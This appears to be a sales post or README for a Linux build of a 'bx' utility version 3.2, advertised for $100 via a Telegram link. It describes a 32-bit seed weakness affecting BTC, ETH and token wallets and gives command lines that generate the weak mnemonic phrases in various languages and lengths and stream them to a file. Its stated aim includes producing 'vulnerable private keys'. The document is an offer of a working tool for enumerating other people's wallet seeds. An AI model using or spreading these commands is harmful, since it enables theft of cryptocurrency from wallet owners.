Only for Linux (ubuntu)
The developers have removed the utility everywhere, it is impossible to compile from the source code.<br>
It is very difficult to find a vulnerable version 3.2.<br>
Miner got the explorer from the docker, now you can buy it $100 https://t.me/cuda8<br>
32-bit vulnerability is 4294967295 mnemonic phrases.<br>
9 languages, 12, 15, 18, 21, 24 words. 193,273,528,275 is tens of TB.<br>
The vulnerability affected not only BTC, ETH, but also tokens, other coins.<br>

Launch example.<br>
```./bx-linux-x64-qrcode_3_2 seed -b 256 | ./bx-linux-x64-qrcode_3_2 mnemonic-new```

```./bx-linux-x64-qrcode_3_2 seed -b 256 | ./bx-linux-x64-qrcode_3_2 mnemonic-new -l es```

```./bx-linux-x64-qrcode_3_2 seed -b 128 | ./bx-linux-x64-qrcode_3_2 mnemonic-new -l ja```

Languages<br>
--language<br>
en (default)<br>
-l es<br>
-l fr<br>
-l it<br>
-l ja<br>
-l cs<br>
-l ru<br>
-l uk<br>
-l zh_Hans<br>
-l zh_Hant<br>

(Phrase length 12, 15, 18, 21, 24)<br>
-b 128<br>
-b 160<br>
-b 192<br>
-b 224<br>
-b 256<br>

A multi-cpu script is sent to the explorer that generates a stream of phrases into a text file.<br>
It is also possible to generate vulnerable private keys from BTC, ETH and other coins.<br>
```./bx-linux-x64-qrcode_3_2 seed -b 256 >> Out.txt```
